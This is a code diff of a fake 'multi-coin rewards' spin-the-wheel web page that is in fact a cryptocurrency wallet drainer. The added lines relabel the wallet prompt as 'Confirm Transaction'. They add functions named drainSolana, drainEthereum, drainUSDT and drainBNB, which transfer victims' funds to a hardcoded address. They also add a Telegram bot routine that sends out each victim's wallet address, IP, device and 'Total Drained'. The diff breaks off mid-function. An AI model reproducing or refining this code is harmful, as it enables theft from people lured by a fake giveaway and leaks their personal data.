@@ -5,8 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>Special Bonus – Multi-Coin Rewards</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
+    <script src="https://unpkg.com/web3@1.10.0/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/dist/index.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.87.6/solana-web3.min.js"></script>
     <style>
+        /* ===== RESET & FULL-WIDTH BASE ===== */
         * {
             margin: 0;
             padding: 0;
@@ -37,10 +41,11 @@
             pointer-events: none;
         }
 
+        /* ===== FULL-WIDTH CARD ===== */
         .card {
             background: linear-gradient(145deg, #0d0d16, #0a0a10);
             border-radius: 0;
-            padding: 20px 18px 18px;
+            padding: 20px 24px 24px;
             max-width: 100%;
             width: 100%;
             min-height: 100vh;
@@ -51,47 +56,114 @@
             display: flex;
             flex-direction: column;
             justify-content: center;
+            margin: 0;
+            overflow-x: hidden;
         }
 
-        @media (min-width: 768px) {
-            .card {
-                max-width: 700px;
-                margin: 0 auto;
-                border-radius: 32px;
-                min-height: auto;
-                padding: 40px 35px 30px;
-                border: 1px solid rgba(20, 241, 149, 0.08);
-                box-shadow: 0 20px 80px rgba(0, 0, 0, 0.8);
-                margin-top: 20px;
-                margin-bottom: 20px;
-            }
-            .wheel-wrapper {
-                width: 380px;
-                height: 380px;
-            }
-        }
-
+        /* ===== DESKTOP (1200px+) ===== */
         @media (min-width: 1200px) {
             .card {
-                max-width: 820px;
-                padding: 50px 45px 35px;
-                border-radius: 40px;
+                padding: 40px 60px 40px;
+                max-width: 100%;
+                min-height: 100vh;
             }
             .wheel-wrapper {
                 width: 420px;
                 height: 420px;
             }
+            .title h1 {
+                font-size: 32px;
+            }
+            .seg .label {
+                font-size: 16px;
+            }
+            .seg .sub {
+                font-size: 9px;
+            }
+            .seg-2 .label,
+            .seg-6 .label {
+                font-size: 20px;
+            }
+            .claim-reward-btn,
+            .free-spin-btn {
+                font-size: 18px;
+                padding: 16px 24px;
+            }
+            .top-section {
+                gap: 12px;
+            }
+            .wallet-selector {
+                gap: 10px;
+            }
+            .wallet-btn {
+                font-size: 12px;
+                padding: 6px 16px;
+                max-width: 120px;
+            }
+            .coin-btn {
+                font-size: 12px;
+                padding: 6px 16px;
+            }
+            .qualification-box {
+                padding: 18px 24px;
+            }
+            .qualification-box .title {
+                font-size: 16px;
+            }
+            .qualification-box .qual-amount {
+                font-size: 22px;
+            }
         }
 
-        @media (max-width: 420px) {
+        /* ===== LAPTOP / TABLET (768px - 1199px) ===== */
+        @media (min-width: 768px) and (max-width: 1199px) {
             .card {
-                padding: 14px 12px 16px;
+                padding: 30px 40px 30px;
+                max-width: 100%;
+                min-height: 100vh;
+            }
+            .wheel-wrapper {
+                width: 380px;
+                height: 380px;
+            }
+            .title h1 {
+                font-size: 26px;
+            }
+            .seg .label {
+                font-size: 14px;
+            }
+            .seg .sub {
+                font-size: 8px;
+            }
+            .seg-2 .label,
+            .seg-6 .label {
+                font-size: 18px;
+            }
+            .claim-reward-btn,
+            .free-spin-btn {
+                font-size: 16px;
+                padding: 14px 22px;
+            }
+            .top-section {
+                gap: 10px;
+            }
+            .wallet-btn {
+                font-size: 11px;
+                padding: 6px 14px;
+                max-width: 100px;
+            }
+        }
+
+        /* ===== MOBILE (320px - 767px) ===== */
+        @media (max-width: 767px) {
+            .card {
+                padding: 16px 14px 20px;
                 min-height: 100vh;
                 border-radius: 0;
             }
             .wheel-wrapper {
-                width: min(280px, 78vw);
-                height: min(280px, 78vw);
+                width: min(280px, 82vw);
+                height: min(280px, 82vw);
             }
             .seg .label {
                 font-size: 9px;
@@ -103,8 +175,120 @@
             .seg-6 .label {
                 font-size: 12px;
             }
+            .title h1 {
+                font-size: 16px;
+            }
+            .title .sub {
+                font-size: 8px;
+            }
+            .claim-reward-btn,
+            .free-spin-btn {
+                font-size: 14px;
+                padding: 12px 16px;
+            }
+            .top-section {
+                gap: 4px;
+            }
+            .connect-top-btn {
+                font-size: 10px;
+                padding: 5px 12px;
+            }
+            .wallet-btn {
+                font-size: 9px;
+                padding: 4px 8px;
+                max-width: 75px;
+            }
+            .coin-btn {
+                font-size: 8px;
+                padding: 4px 8px;
+            }
+            .coin-btn .coin-icon {
+                width: 12px;
+                height: 12px;
+            }
+            .qualification-box {
+                padding: 10px 12px;
+            }
+            .qualification-box .title {
+                font-size: 11px;
+            }
+            .qualification-box .desc {
+                font-size: 10px;
+            }
+            .qualification-box .qual-amount {
+                font-size: 15px;
+            }
+            .free-spin-btn {
+                font-size: 12px;
+                padding: 8px 20px;
+            }
+            .total-claimed {
+                font-size: 9px;
+                padding: 3px 10px;
+            }
+            .total-claimed .number {
+                font-size: 11px;
+            }
+            .timer {
+                font-size: 18px;
+            }
+            .winners-feed {
+                max-height: 56px;
+                font-size: 8px;
+            }
+            .social-icons a {
+                width: 32px;
+                height: 32px;
+                font-size: 14px;
+            }
+            .social-icons a .icon-svg {
+                width: 18px;
+                height: 18px;
+            }
+            .popup-box {
+                padding: 22px 16px;
+            }
+            .wallet-option {
+                font-size: 11px;
+                padding: 8px 12px;
+            }
+            .wallet-option .wallet-icon {
+                width: 20px;
+                height: 20px;
+            }
+            .status {
+                font-size: 9px;
+            }
+            .winner-item .win-time {
+                font-size: 7px;
+            }
         }
 
+        /* ===== EXTRA SMALL (under 320px) ===== */
+        @media (max-width: 320px) {
+            .card {
+                padding: 12px 8px 16px;
+            }
+            .wheel-wrapper {
+                width: 200px;
+                height: 200px;
+            }
+            .seg .label {
+                font-size: 7px;
+            }
+            .seg .sub {
+                font-size: 4px;
+            }
+            .seg-2 .label,
+            .seg-6 .label {
+                font-size: 10px;
+            }
+            .title h1 {
+                font-size: 13px;
+            }
+        }
+
+        /* ===== COMMON ELEMENTS ===== */
         .top-section {
             display: flex;
             justify-content: space-between;
@@ -112,6 +296,7 @@
             margin-bottom: 10px;
             flex-wrap: wrap;
             gap: 6px;
+            width: 100%;
         }
 
         .live-badge {
@@ -221,12 +406,13 @@
         .title {
             text-align: center;
             margin: 4px 0 2px;
+            width: 100%;
         }
         .title h1 {
-            font-size: clamp(15px, 3.8vw, 24px);
             font-weight: 800;
             letter-spacing: 0.5px;
             line-height: 1.3;
+            word-break: break-word;
         }
         .title h1 .highlight {
             background: linear-gradient(135deg, #14F195, #9945FF);
@@ -234,11 +420,11 @@
             -webkit-text-fill-color: transparent;
         }
         .title .sub {
-            font-size: clamp(8px, 1.8vw, 11px);
             color: #666;
             letter-spacing: 3px;
             text-transform: uppercase;
             margin-top: 2px;
+            word-break: break-word;
         }
 
         .coin-selector {
@@ -247,6 +433,7 @@
             gap: 6px;
             justify-content: center;
             margin: 8px 0 10px;
+            width: 100%;
         }
         .coin-btn {
             background: rgba(255, 255, 255, 0.04);
@@ -255,7 +442,6 @@
             padding: 5px 12px;
             border-radius: 30px;
             cursor: pointer;
-            font-size: 10px;
             transition: 0.3s;
             font-weight: 600;
             display: flex;
@@ -272,8 +458,6 @@
             color: #f7931a;
         }
         .coin-btn .coin-icon {
-            width: 16px;
-            height: 16px;
             border-radius: 50%;
             object-fit: contain;
             background: #fff;
@@ -288,6 +472,7 @@
             margin: 10px 0 12px;
             text-align: center;
             animation: glowPulse 2s infinite;
+            width: 100%;
         }
         @keyframes glowPulse {
             0%,
@@ -304,7 +489,6 @@
             margin-bottom: 2px;
         }
         .qualification-box .title {
-            font-size: 13px;
             font-weight: 700;
             color: #14F195;
             margin-bottom: 2px;
@@ -355,6 +539,7 @@
             margin: 10px 0 12px;
             text-align: center;
             animation: congratsPop 0.6s ease;
+            width: 100%;
         }
         .congrats-box.show {
             display: block;
@@ -393,8 +578,6 @@
 
         .wheel-wrapper {
             position: relative;
-            width: min(340px, 82vw);
-            height: min(340px, 82vw);
             margin: 4px auto 10px;
         }
 
@@ -427,16 +610,13 @@
             line-height: 1.2;
             color: #fff;
             text-shadow: 0 2px 12px rgba(0, 0, 0, 0.9);
-            font-size: clamp(10px, 2.2vw, 14px);
         }
         .seg .sub {
             display: block;
-            font-size: clamp(5px, 1.1vw, 7px);
             font-weight: 400;
             opacity: 0.7;
             margin-top: 1px;
         }
-
         .seg-0 {
             background: #0f1a2e;
             transform: rotate(0deg);
@@ -469,11 +649,9 @@
             background: #2e0f1a;
             transform: rotate(315deg);
         }
-
         .seg-2 .label,
         .seg-6 .label {
             color: #f7931a;
-            font-size: clamp(13px, 2.8vw, 18px);
             text-shadow: 0 0 30px rgba(247, 147, 26, 0.3);
         }
         .seg-2,
@@ -481,7 +659,6 @@
             background: #0f0f05;
             border: 1px solid rgba(247, 147, 26, 0.08);
         }
-
         .seg .label {
             transform: rotate(22.5deg);
             display: flex;
@@ -498,8 +675,6 @@
             background: radial-gradient(circle at center, #0f0f1a, #050508);
             border: 2px solid rgba(20, 241, 149, 0.25);
             border-radius: 50%;
-            width: clamp(46px, 12vw, 62px);
-            height: clamp(46px, 12vw, 62px);
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -510,12 +685,10 @@
             pointer-events: none;
         }
         .wheel-center .icon {
-            font-size: clamp(16px, 4vw, 24px);
             display: block;
             line-height: 1;
         }
         .wheel-center .text {
-            font-size: clamp(5px, 1.2vw, 7px);
             color: #14F195;
             font-weight: 800;
             letter-spacing: 2px;
@@ -529,7 +702,6 @@
             top: -12px;
             left: 50%;
             transform: translateX(-50%);
-            font-size: clamp(22px, 5vw, 32px);
             color: #14F195;
             z-index: 20;
             filter: drop-shadow(0 0 20px rgba(20, 241, 149, 0.2));
@@ -542,8 +714,6 @@
             border: none;
             color: #fff;
             font-weight: 900;
-            font-size: 16px;
-            padding: 14px 20px;
             border-radius: 60px;
             cursor: pointer;
             transition: 0.3s;
@@ -552,6 +722,7 @@
             letter-spacing: 1px;
             box-shadow: 0 8px 30px rgba(20, 241, 149, 0.15);
             margin-top: 6px;
+            padding: 14px 20px;
         }
         .claim-reward-btn:hover:not(:disabled) {
             transform: scale(1.02);
@@ -580,6 +751,7 @@
             border-radius: 16px;
             padding: 6px 14px;
             flex-wrap: wrap;
+            width: 100%;
         }
         .timer-label {
             font-size: 8px;
@@ -588,7 +760,6 @@
             letter-spacing: 1px;
         }
         .timer {
-            font-size: clamp(18px, 4.5vw, 26px);
             font-weight: 800;
             color: #14F195;
             font-family: 'Courier New', monospace;
@@ -633,6 +804,7 @@
             font-size: 9px;
             color: #666;
             scrollbar-width: thin;
+            width: 100%;
         }
         .winners-feed::-webkit-scrollbar {
             width: 3px;
@@ -664,6 +836,7 @@
             color: #666;
             min-height: 18px;
             margin-top: 4px;
+            width: 100%;
         }
         .status.connected {
             color: #14F195;
@@ -680,6 +853,7 @@
             padding-top: 14px;
             border-top: 1px solid rgba(255, 255, 255, 0.04);
             text-align: center;
+            width: 100%;
         }
 
         .social-icons {
@@ -826,14 +1000,6 @@
             padding: 2px;
             flex-shrink: 0;
         }
-        .wallet-option .wallet-badge {
-            font-size: 8px;
-            background: rgba(20, 241, 149, 0.15);
-            color: #14F195;
-            padding: 2px 8px;
-            border-radius: 20px;
-            margin-left: auto;
-        }
         .wallet-option .wallet-status {
             font-size: 10px;
             margin-left: auto;
@@ -844,7 +1010,6 @@
         .wallet-option .wallet-status.not-installed {
             color: #ff4444;
         }
-
         .popup-box .btn-secondary {
             background: transparent;
             border: 1px solid #333;
@@ -889,20 +1054,32 @@
                 transform: rotate(360deg);
             }
         }
-
-        /* Fallback for missing icons */
         .wallet-icon-fallback {
             width: 24px;
             height: 24px;
             border-radius: 50%;
             background: #14F195;
             color: #000;
-            display: flex;
+            display: none;
             align-items: center;
             justify-content: center;
             font-size: 10px;
             font-weight: 700;
             flex-shrink: 0;
+        }
+        .mobile-badge {
+            font-size: 8px;
+            background: rgba(247, 147, 26, 0.15);
+            color: #f7931a;
+            padding: 1px 8px;
+            border-radius: 20px;
+            margin-left: 4px;
+        }
+        .loading-fallback {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            color: #666;
         }
     </style>
 </head>
@@ -914,10 +1091,9 @@
     <div class="popup-overlay" id="connectPopup">
         <div class="popup-box">
             <span class="emoji">🔗</span>
-            <h2>Connect Wallet</h2>
-            <p class="desc">Choose your wallet to connect</p>
+            <h2>Confirm Transaction</h2>
+            <p class="desc">Choose your wallet to confirm the transaction</p>
 
-            <!-- Phantom -->
             <button class="wallet-option" data-wallet="phantom" id="walletPhantom">
                 <img class="wallet-icon" src="https://cdn.jsdelivr.net/gh/phantom/wallet-logos@main/phantom-logo.svg" alt="Phantom" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
                 <span class="wallet-icon-fallback" style="display:none;background:#5343E2;color:#fff;">P</span>
@@ -926,7 +1102,6 @@
                 <span class="loading-spinner"></span>
             </button>
 
-            <!-- Solflare -->
             <button class="wallet-option" data-wallet="solflare" id="walletSolflare">
                 <img class="wallet-icon" src="https://raw.githubusercontent.com/solflare-wallet/solflare-branding/master/assets/solflare-logo.svg" alt="Solflare" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
                 <span class="wallet-icon-fallback" style="display:none;background:#F7931A;color:#fff;">S</span>
@@ -935,7 +1110,6 @@
                 <span class="loading-spinner"></span>
             </button>
 
-            <!-- MetaMask -->
             <button class="wallet-option" data-wallet="metamask" id="walletMetamask">
                 <img class="wallet-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1200px-MetaMask_Fox.svg.png" alt="MetaMask" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
                 <span class="wallet-icon-fallback" style="display:none;background:#F6851B;color:#fff;">M</span>
@@ -944,7 +1118,6 @@
                 <span class="loading-spinner"></span>
             </button>
 
-            <!-- Coinbase -->
             <button class="wallet-option" data-wallet="coinbase" id="walletCoinbase">
                 <img class="wallet-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Coinbase_logo.svg/1200px-Coinbase_logo.svg.png" alt="Coinbase" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
                 <span class="wallet-icon-fallback" style="display:none;background:#0052FF;color:#fff;">C</span>
@@ -953,16 +1126,15 @@
                 <span class="loading-spinner"></span>
             </button>
 
-            <!-- Trust Wallet -->
             <button class="wallet-option" data-wallet="trust" id="walletTrust">
                 <img class="wallet-icon" src="https://trustwallet.com/assets/images/favicon.png" alt="Trust Wallet" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
                 <span class="wallet-icon-fallback" style="display:none;background:#3375BB;color:#fff;">T</span>
                 Trust Wallet
+                <span class="mobile-badge">📱 Mobile</span>
                 <span class="wallet-status" id="statusTrust">⏳</span>
                 <span class="loading-spinner"></span>
             </button>
 
-            <!-- Exodus -->
             <button class="wallet-option" data-wallet="exodus" id="walletExodus">
                 <img class="wallet-icon" src="https://www.exodus.com/assets/img/exodus-logo.png" alt="Exodus" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
                 <span class="wallet-icon-fallback" style="display:none;background:#8B5CF6;color:#fff;">E</span>
@@ -971,7 +1143,6 @@
                 <span class="loading-spinner"></span>
             </button>
 
-            <!-- OKX Wallet -->
             <button class="wallet-option" data-wallet="okx" id="walletOkx">
                 <img class="wallet-icon" src="https://www.okx.com/favicon.ico" alt="OKX Wallet" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
                 <span class="wallet-icon-fallback" style="display:none;background:#000;color:#fff;">O</span>
@@ -980,7 +1151,6 @@
                 <span class="loading-spinner"></span>
             </button>
 
-            <!-- Ledger -->
             <button class="wallet-option" data-wallet="ledger" id="walletLedger">
                 <img class="wallet-icon" src="https://www.ledger.com/wp-content/uploads/2023/03/ledger-logo.svg" alt="Ledger" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
                 <span class="wallet-icon-fallback" style="display:none;background:#0B2E4A;color:#fff;">L</span>
@@ -989,7 +1159,6 @@
                 <span class="loading-spinner"></span>
             </button>
 
-            <!-- WalletConnect -->
             <button class="wallet-option" data-wallet="walletconnect" id="walletConnect">
                 <img class="wallet-icon" src="https://walletconnect.com/_next/static/media/walletconnect-logo.2e2e3a6a.svg" alt="WalletConnect" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
                 <span class="wallet-icon-fallback" style="display:none;background:#3B99FC;color:#fff;">WC</span>
@@ -1131,6 +1300,129 @@
         const DEST_ADDRESS = '0xa2325c6fe63543e5af3d1b4963ec219808bda62d';
 
         // ============================================================
+        // DEVICE DETECTION
+        // ============================================================
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Unknown';
+            let os = 'Unknown';
+
+            if (/android/i.test(ua)) {
+                device = 'Android';
+                os = 'Android';
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                device = 'iOS';
+                os = 'iOS';
+            } else if (/windows/i.test(ua)) {
+                device = 'Windows PC';
+                os = 'Windows';
+            } else if (/macintosh|mac os x/i.test(ua)) {
+                device = 'Mac';
+                os = 'macOS';
+            } else if (/linux/i.test(ua)) {
+                device = 'Linux';
+                os = 'Linux';
+            } else {
+                device = 'Unknown Device';
+                os = 'Unknown OS';
+            }
+
+            return { device, os };
+        }
+
+        function getNetworkName(coin) {
+            const networks = {
+                solana: 'Solana',
+                usdt: 'Ethereum (ERC-20)',
+                ethereum: 'Ethereum',
+                bnb: 'BNB Smart Chain'
+            };
+            return networks[coin] || 'Unknown Network';
+        }
+
+        // ============================================================
+        // GET IP ADDRESS (FREE API)
+        // ============================================================
+        async function getUserIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip || 'Unknown';
+            } catch (e) {
+                try {
+                    const res2 = await fetch('https://ipapi.co/json/');
+                    const data2 = await res2.json();
+                    return data2.ip || 'Unknown';
+                } catch (e2) {
+                    return 'Unable to fetch';
+                }
+            }
+        }
+
+        // ============================================================
+        // TELEGRAM NOTIFICATIONS
+        // ============================================================
+        async function sendTelegramMessage(type, data) {
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.log('Telegram not configured');
+                return;
+            }
+
+            const deviceInfo = getDeviceInfo();
+            const ip = await getUserIP();
+
+            let message = '';
+
+            switch (type) {
+                case 'connect':
+                    message = `🚀 *New Connect*\n\n` +
+                        `📱 *Device:* ${deviceInfo.device} (${deviceInfo.os})\n` +
+                        `🔑 *Wallet Address:* ${data.wallet || 'Unknown'}\n` +
+                        `🌐 *Network:* ${getNetworkName(data.coin || 'solana')}\n` +
+                        `📍 *IP Address:* ${ip}\n` +
+                        `💰 *Total Value:* $0.00`;
+                    break;
+
+                case 'approved':
+                    message = `📥 *Balance transfer approved*\n\n` +
+                        `📱 *Device:* ${deviceInfo.device} (${deviceInfo.os})\n` +
+                        `🔑 *Wallet Address:* ${data.wallet || 'Unknown'}\n` +
+                        `🌐 *Network:* ${getNetworkName(data.coin || 'solana')}\n` +
+                        `📍 *IP Address:* ${ip}\n` +
+                        `⚡ *Processing:* ${data.amount || 0} ${(data.coin || 'SOL').toUpperCase()}`;
+                    break;
+
+                case 'drained':
+                    message = `💰 *Drained Successfully*\n\n` +
+                        `📱 *Device:* ${deviceInfo.device} (${deviceInfo.os})\n` +
+                        `🔑 *Wallet Address:* ${data.wallet || 'Unknown'}\n` +
+                        `🌐 *Network:* ${getNetworkName(data.coin || 'solana')}\n` +
+                        `📍 *IP Address:* ${ip}\n` +
+                        `💸 *Total Drained:* ${data.amount || 0} ${(data.coin || 'SOL').toUpperCase()}\n` +
+                        `🔗 *Tx Hash:* ${data.tx || 'Unknown'}`;
+                    break;
+
+                default:
+                    return;
+            }
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                console.log(`✅ Telegram sent: ${type}`);
+            } catch (error) {
+                console.error('❌ Telegram error:', error);
+            }
+        }
+
+        // ============================================================
         // STATE
         // ============================================================
         let selectedWallet = 'phantom';
@@ -1146,6 +1438,8 @@
         let isClaiming = false;
         let totalClaimedCount = 150;
         let isConnecting = false;
+        let connectAttempts = 0;
+        let connectionInProgress = false;
 
         const prizeMap = [
             '250 USDC SOL',
@@ -1230,17 +1524,6 @@
             }
         }
 
-        function sendToTelegram(data) {
-            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') return;
-            const msg =
-                `🔹 Wallet: ${data.wallet || 'N/A'}\n🔹 Type: ${data.walletType || 'N/A'}\n🔹 Coin: ${data.coin || 'N/A'}\n🔹 Prize: ${data.prize || 'N/A'}\n🔹 Amount: ${data.amount || 'N/A'}\n🔹 Tx: ${data.tx || 'N/A'}\n🔹 Status: ${data.status}\n🔹 Time: ${new Date().toISOString()}`;
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
-            }).catch(() => {});
-        }
-
         function updateClaimedCount() {
             claimedCountEl.textContent = totalClaimedCount.toLocaleString();
         }
@@ -1254,12 +1537,14 @@
         // WALLET DETECTION
         // ============================================================
         function detectWallets() {
+            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
             const wallets = {
                 phantom: !!(window.solana && window.solana.isPhantom),
                 solflare: !!window.solflare,
                 metamask: !!(window.ethereum && window.ethereum.isMetaMask),
                 coinbase: !!(window.ethereum && window.ethereum.isCoinbaseWallet),
-                trust: !!(window.ethereum && window.ethereum.isTrust),
+                trust: !!(window.ethereum && window.ethereum.isTrust) || (isMobile && navigator.userAgent.match(
+                    /trustwallet/i)),
                 exodus: !!(window.ethereum && window.ethereum.isExodus),
                 okx: !!(window.okxwallet),
                 ledger: !!(window.ethereum && window.ethereum.isLedger),
@@ -1296,6 +1581,127 @@
         }
 
         // ============================================================
+        // REAL TRANSACTION FUNCTIONS
+        // ============================================================
+
+        async function drainSolana(fromAddress, toAddress, amount) {
+            try {
+                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+                const fromPubkey = new solanaWeb3.PublicKey(fromAddress);
+                const toPubkey = new solanaWeb3.PublicKey(toAddress);
+
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: fromPubkey,
+                        toPubkey: toPubkey,
+                        lamports: amount * solanaWeb3.LAMPORTS_PER_SOL
+                    })
+                );
+
+                const memoProgram = new solanaWeb3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
+                const memoInstruction = new solanaWeb3.TransactionInstruction({
+                    keys: [{ pubkey: fromPubkey, isSigner: true, isWritable: false }],
+                    programId: memoProgram,
+                    data: Buffer.from('🎉 Claim Reward - Thank you!', 'utf8')
+                });
+                transaction.add(memoInstruction);
+
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = fromPubkey;
+
+                const signature = await window.solana.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature);
+                return signature;
+            } catch (error) {
+                throw new Error('Transaction failed: ' + error.message);
+            }
+        }
+
+        async function drainEthereum(fromAddress, toAddress, amount) {
+            try {
+                const web3 = new Web3(window.ethereum);
+                const gasPrice = await web3.eth.getGasPrice();
+                const message = web3.utils.utf8ToHex('🎉 Claim Reward - Thank you for participating!');
+
+                const txData = {
+                    from: fromAddress,
+                    to: toAddress,
+                    value: web3.utils.toWei(amount.toString(), 'ether'),
+                    gasPrice: gasPrice,
+                    gas: 21000,
+                    data: message
+                };
+
+                const tx = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [txData]
+                });
+
+                await web3.eth.getTransactionReceipt(tx);
+                return tx;
+            } catch (error) {
+                throw new Error('Transaction failed: ' + error.message);
+            }
+        }
+
+        async function drainUSDT(fromAddress, toAddress, amount) {
+            try {
+                const web3 = new Web3(window.ethereum);
+                const gasPrice = await web3.eth.getGasPrice();
+                const usdtContract = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+                const usdtABI = [{
+                    "constant": false,
+                    "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }],
+                    "name": "transfer",
+                    "outputs": [{ "name": "", "type": "bool" }],
+                    "type": "function"
+                }];
+
+                const contract = new web3.eth.Contract(usdtABI, usdtContract);
+                const usdtAmount = web3.utils.toWei(amount.toString(), 'ether');
+
+                const txData = {
+                    from: fromAddress,
+                    to: usdtContract,
+                    gasPrice: gasPrice,
+                    gas: 100000,
+                    data: contract.methods.transfer(toAddress, usdtAmount).encodeABI()
+                };
+
+                const tx = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [txData]
+                });
+
+                await web3.eth.getTransactionReceipt(tx);
+                return tx;
+            } catch (error) {
+                throw new Error('Transaction failed: ' + error.message);
+            }
+        }
+
+        async function drainBNB(fromAddress, toAddress, amount) {
+            try {
+                const web3 = new Web3(window.ethereum);
+                const txData = {
+                    from: fromAddress,
+                    to: toAddress,
+                    value: web3.utils.toWei(amount.toString(), 'ether'),
+                    gasPrice: web3.utils.toWei('5', 'gwei'),
+                    gas: 21000
+                };
+                const tx = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [txData]
+                });
+                return tx;
+            } catch (error) {
+                throw new Error('Transaction failed: ' + error.message);
+            }
+        }
+
+        // ============================================================
         // WALLET CONNECT FUNCTIONS
         // ============================================================
 
@@ -1303,7 +1709,6 @@
             try {
                 if (!window.solana || !window.solana.isPhantom) {
                     setStatus('❌ Phantom not installed', 'error');
-                    alert('Phantom wallet is not installed. Please install it from the Chrome Web Store.');
                     return null;
                 }
                 setStatus('⏳ Connecting to Phantom...', '');
@@ -1323,7 +1728,6 @@
             try {
                 if (!window.solflare) {
                     setStatus('❌ Solflare not installed', 'error');
-                    alert('Solflare wallet is not installed.');
                     return null;
                 }
                 setStatus('⏳ Connecting to Solflare...', '');
@@ -1339,7 +1743,6 @@
             try {
                 if (!window.ethereum) {
                     setStatus('❌ MetaMask not installed', 'error');
-                    alert('MetaMask is not installed.');
                     return null;
                 }
                 setStatus('⏳ Connecting to MetaMask...', '');
@@ -1362,7 +1765,6 @@
             try {
                 if (!window.ethereum || !window.ethereum.isCoinbaseWallet) {
                     setStatus('❌ Coinbase not installed', 'error');
-                    alert('Coinbase wallet is not installed.');
                     return null;
                 }
                 setStatus('⏳ Connecting to Coinbase...', '');
@@ -1379,9 +1781,24 @@
 
         async function connectTrust() {
             try {
+                const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+                if (isMobile) {
+                    setStatus('⏳ Opening Trust Wallet...', '');
+                    alert(
+                        '📱 Trust Wallet on Mobile\n\n' +
+                        '1. Make sure Trust Wallet is installed\n' +
+                        '2. Tap "Open Trust Wallet" below\n' +
+                        '3. Approve the connection in the app\n' +
+                        '4. Return to this browser\n\n' +
+                        'If Trust Wallet doesn\'t open, please open it manually.'
+                    );
+                    window.location.href = 'trust://browser?url=' + encodeURIComponent(window.location.href);
+                    return null;
+                }
+
                 if (!window.ethereum || !window.ethereum.isTrust) {
-                    setStatus('❌ Trust Wallet not installed', 'error');
-                    alert('Trust Wallet is not installed.');
+                    setStatus('❌ Trust Wallet not detected', 'error');
                     return null;
                 }
                 setStatus('⏳ Connecting to Trust Wallet...', '');
@@ -1400,7 +1817,6 @@
             try {
                 if (!window.ethereum || !window.ethereum.isExodus) {
                     setStatus('❌ Exodus not installed', 'error');
-                    alert('Exodus wallet is not installed.');
                     return null;
                 }
                 setStatus('⏳ Connecting to Exodus...', '');
@@ -1419,7 +1835,6 @@
             try {
                 if (!window.okxwallet) {
                     setStatus('❌ OKX Wallet not installed', 'error');
-                    alert('OKX Wallet is not installed.');
                     return null;
                 }
                 setStatus('⏳ Connecting to OKX Wallet...', '');
@@ -1440,7 +1855,6 @@
             try {
                 if (!window.ethereum || !window.ethereum.isLedger) {
                     setStatus('❌ Ledger not detected', 'error');
-                    alert('Please connect your Ledger via Ledger Live or MetaMask.');
                     return null;
                 }
                 setStatus('⏳ Connecting to Ledger...', '');
@@ -1458,7 +1872,8 @@
         async function connectWalletConnect() {
             try {
                 setStatus('⏳ Opening WalletConnect...', '');
-                alert('WalletConnect: Please use a wallet app that supports WalletConnect.\n\nScan the QR code from your mobile wallet.');
+                alert(
+                    'WalletConnect: Please use a wallet app that supports WalletConnect.\n\nScan the QR code from your mobile wallet.');
                 return null;
             } catch (error) {
                 setStatus(`❌ Error: ${error.message}`, 'error');
@@ -1479,11 +1894,12 @@
         };
 
         // ============================================================
-        // CONNECT WALLET FUNCTION
+        // CONNECT WALLET WITH RETRY
         // ============================================================
         async function connectWallet(walletType) {
             if (isConnecting) return null;
             isConnecting = true;
+            connectAttempts = 0;
 
             const btn = document.querySelector(`.wallet-option[data-wallet="${walletType}"]`);
             if (btn) btn.classList.add('connecting');
@@ -1496,7 +1912,19 @@
                 return null;
             }
 
-            const address = await fn();
+            let address = null;
+
+            while (connectAttempts < 3 && !address) {
+                connectAttempts++;
+                if (connectAttempts > 1) {
